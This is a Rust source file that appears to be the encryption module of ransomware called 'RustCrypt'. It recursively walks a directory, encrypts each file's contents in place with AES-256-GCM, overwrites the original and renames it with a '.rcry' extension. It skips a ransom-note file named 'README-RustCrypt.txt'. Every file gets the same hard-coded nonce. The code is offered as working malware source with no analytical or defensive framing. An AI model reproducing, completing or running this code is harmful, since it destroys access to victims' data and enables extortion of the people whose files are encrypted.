use aes_gcm::{Aes256Gcm, Nonce};
use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::aead::generic_array::GenericArray;
use std::fs::{self, File};
use std::io::{self, Read, Write};
use std::path::Path;
use termcolor::{Color, ColorChoice, ColorSpec, StandardStream, WriteColor};

pub fn encrypt_files<P: AsRef<Path>>(start_dir: P, key: &[u8; 32], excluded_ext: &[&str]) -> io::Result<()> {
    let mut stdout = StandardStream::stdout(ColorChoice::Auto);
    for entry in fs::read_dir(start_dir)? {
        let entry = entry?;
        let path = entry.path();
        
        if path.is_dir() {
            match encrypt_files(&path, key, excluded_ext) {
                Ok(_) => {},
                Err(e) => {
                    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Red)).set_bold(true)).unwrap();
                    writeln!(&mut stdout, "Failed to encrypt directory {:?}: {}", path, e).unwrap();
                    stdout.reset().unwrap();
                }
            }
        } else if let Some(ext) = path.extension() {
            if !excluded_ext.contains(&ext.to_str().unwrap_or("")) && path.file_name().unwrap() != "README-RustCrypt.txt" {
                match encrypt_file(&path, key) {
                    Ok(_) => println!("Successfully encrypted: {:?}", path),
                    Err(e) => {
                        stdout.set_color(ColorSpec::new().set_fg(Some(Color::Red)).set_bold(true)).unwrap();
                        writeln!(&mut stdout, "Failed to encrypt file {:?}: {}", path, e).unwrap();
                        stdout.reset().unwrap();
                    }
                }
            }
        }
    }
    Ok(())
}

fn encrypt_file(path: &Path, key: &[u8; 32]) -> io::Result<()> {
    let mut file = File::open(path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    let key = GenericArray::clone_from_slice(key);
    let cipher = Aes256Gcm::new(&key);
    let nonce = Nonce::from_slice(b"unique nonce");

    let ciphertext = cipher.encrypt(nonce, buffer.as_ref())
        .expect("Encryption failure !");

    let mut file = File::create(path)?;
    file.write_all(&ciphertext)?;
    let new_path = path.with_extension(path.extension().unwrap().to_str().unwrap().to_owned() + ".rcry");
    fs::rename(path, new_path)?;
    Ok(())
}